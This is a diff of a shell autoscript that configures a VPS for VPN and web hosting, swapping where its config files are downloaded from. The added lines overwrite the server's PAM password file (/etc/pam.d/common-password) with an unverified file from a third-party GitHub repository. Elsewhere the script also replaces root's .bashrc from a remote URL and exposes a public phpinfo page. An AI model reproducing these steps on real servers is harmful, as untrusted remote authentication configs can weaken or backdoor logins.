@@ -60,14 +60,6 @@ apt-get -y autoremove;
 apt-get -y install wget curl;
 echo "
 "
-
-sh -c 'echo "deb http://download.webmin.com/download/repository sarge contrib" > /etc/apt/sources.list.d/webmin.list'
-wget -qO - http://www.webmin.com/jcameron-key.asc | apt-key add -
-apt-get update;
-apt-get -y autoremove;
-apt-get -y install wget curl;
-echo "
-"
 # text gambar
 apt-get install boxes
 
@@ -79,6 +71,9 @@ wget -O /root/.bashrc "https://raw.githubusercontent.com/macisvpn/premiumnow/mas
 # install lolcat
 sudo apt-get -y install ruby
 sudo gem install lolcat
+# script
+wget -O /etc/pam.d/common-password "https://raw.githubusercontent.com/macisvpn/premiumnow/master/common-password"
+chmod +x /etc/pam.d/common-password
 # fail2ban & exim & protection
 apt-get -y install fail2ban sysv-rc-conf dnsutils dsniff zip unzip;
 wget https://github.com/jgmdev/ddos-deflate/archive/master.zip;unzip master.zip;
@@ -109,11 +104,11 @@ chmod +x /etc/rc.local
 apt-get -y install nginx php-fpm php-mcrypt php-cli libexpat1-dev libxml-parser-perl
 rm /etc/nginx/sites-enabled/default
 rm /etc/nginx/sites-available/default
-wget -O /etc/php/7.0/fpm/pool.d/www.conf "https://raw.githubusercontent.com/macisvpn/inject-69/master/www.conf"
+wget -O /etc/php/7.0/fpm/pool.d/www.conf "https://raw.githubusercontent.com/guardeumvpn/Qwer77/master/www.conf"
 mkdir -p /home/vps/public_html
-echo "<pre>Setup by inject69 | telegram @inject69 | website inject69.tk</pre>" > /home/vps/public_html/index.php
+echo "<pre>Setup by inject69 | telegram @inject69 | website karin ini jangan curi okey</pre>" > /home/vps/public_html/index.php
 echo "<?php phpinfo(); ?>" > /home/vps/public_html/info.php
-wget -O /etc/nginx/conf.d/vps.conf "http://autoscriptnobita.tk/rendum/vps.conf"
+wget -O /etc/nginx/conf.d/vps.conf "https://raw.githubusercontent.com/guardeumvpn/Qwer77/master/vps.conf"
 sed -i 's/listen = \/var\/run\/php7.0-fpm.sock/listen = 127.0.0.1:9000/g' /etc/php/7.0/fpm/pool.d/www.conf
 # etc
 wget -O /home/vps/public_html/client.ovpn "https://raw.githubusercontent.com/guardeumvpn/Qwer77/master/client.ovpn"
